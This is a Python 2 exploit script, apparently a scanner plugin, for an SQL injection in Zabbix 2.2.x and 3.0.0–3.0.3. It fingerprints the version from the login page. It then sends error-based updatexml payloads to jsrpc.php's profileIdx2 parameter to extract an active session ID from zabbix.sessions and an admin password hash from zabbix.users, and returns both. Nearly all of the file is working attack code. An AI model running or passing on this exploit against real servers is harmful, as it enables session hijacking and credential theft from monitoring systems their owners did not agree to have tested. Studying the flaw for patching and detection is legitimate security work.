# -*-coding:utf-8-*-
# autor:Nan3r
# example: zabbix-sqli.py http://url
# version:2.2.x, 3.0.0-3.0.3
# passwd middle 16byte 
# if admin has login,you can use session login this system

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import sys,requests,re
from bs4 import BeautifulSoup
from plugin.mysql import insert

#return sessionID or passwd
def return_result(url, table):
	if table == 'session':
		payload = '/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,(select(select+concat(sessionid,substring(sessionid,1,16)))+from+zabbix.sessions+LIMIT+0,1),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17'
	elif table == 'passwd':
		payload = '/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,(select(select+concat(passwd,substring(passwd,1,16)))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17'
	try:
		html = requests.get(url+payload, timeout=2)
	except Exception, e:
		return False
	html_text = html.text
	r = re.search(r'\[XPATH syntax error: \'(.*?)\'\]', str(html_text))
	try:
		if r.group(1):
			#return r.group(1)
			return r.group(1)[-3:]+r.group(1)[:29]
	except Exception, e:
		return False
	return False

#version 
def is_bug_version(version):
	# version:2.2.x, 3.0.0-3.0.3
	if re.search(r'(2\.2\.\d+)|(3\.0\.[0-3])',version):
		return True
	return False

# version is true
def isversion(url):
	try:
		html = requests.get(url).text
		soup = BeautifulSoup(html, 'lxml')
		res = soup.find_all('span', attrs={'class':'bold textwhite'})[0].get_text()
	except Exception, e:
		return False
	find_version = re.search(r'Zabbix (.*?) Copyright', res.strip())
	version = find_version.group(1)
	if is_bug_version(version):
		return True
	return False

def poc(url):
	url = 'http://'+url
	if isversion(url):
		sessionid = return_result(url,'session')
		if not sessionid: 
			return False
		md5_passwd = return_result(url, 'passwd')
		if not md5_passwd:
			return False
		return url+' sessionid: '+sessionid+' passwd: '+md5_passwd
	return False